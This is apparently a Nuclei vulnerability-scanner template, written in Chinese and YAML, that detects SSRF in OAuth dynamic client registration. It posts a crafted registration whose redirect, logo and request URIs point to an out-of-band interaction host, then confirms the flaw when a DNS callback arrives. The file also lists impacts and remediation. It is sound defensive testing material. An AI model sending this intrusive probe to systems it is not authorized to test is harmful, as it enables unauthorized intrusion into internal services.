id: ssrf-via-oauth-misconfig

info:
  name: OAuth 动态客户端注册 SSRF 配置错误
  author: KabirSuda
  severity: medium
  description: |-
    该模板用于核查 OAuth 动态客户端注册 SSRF 配置错误。该类问题通常源于服务端会代表用户请求外部 URL、回调地址或代理目标，但缺少目标地址限制。模板向 /connect/register 提交受控的 OAST 地址，并通过外带 DNS/HTTP 交互确认目标服务是否发起了服务端请求。
  reference:
    - https://portswigger.net/research/hidden-oauth-attack-vectors
  metadata:
    max-request: 1
  tags: misconfig,oast,oauth,ssrf,intrusive,vuln
  impact: |-
    - 攻击者可能借助目标服务器访问内网服务、云元数据接口或受访问控制保护的管理端点。
    - 在可回显或可链式利用的场景下，可能进一步造成敏感信息泄露、凭据获取或横向移动。
  remediation: |-
    - 对所有服务端发起的外部请求实施协议、域名、IP 网段和端口 allowlist。
    - 禁止访问内网地址、链路本地地址、云元数据地址和本机回环地址。
    - 对跳转、DNS 解析结果和重定向后的最终地址进行一致性校验，并记录异常请求。
http:
  - raw:
      - |
        POST /connect/register HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept-Language: en-US,en;q=0.9

        {
          "application_type": "web",
          "redirect_uris": ["https://{{interactsh-url}}/callback"],
          "client_name": "{{Hostname}}",
          "logo_uri": "https://{{interactsh-url}}/favicon.ico",
          "subject_type": "pairwise",
          "token_endpoint_auth_method": "client_secret_basic",
          "request_uris": ["https://{{interactsh-url}}"]
        }

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
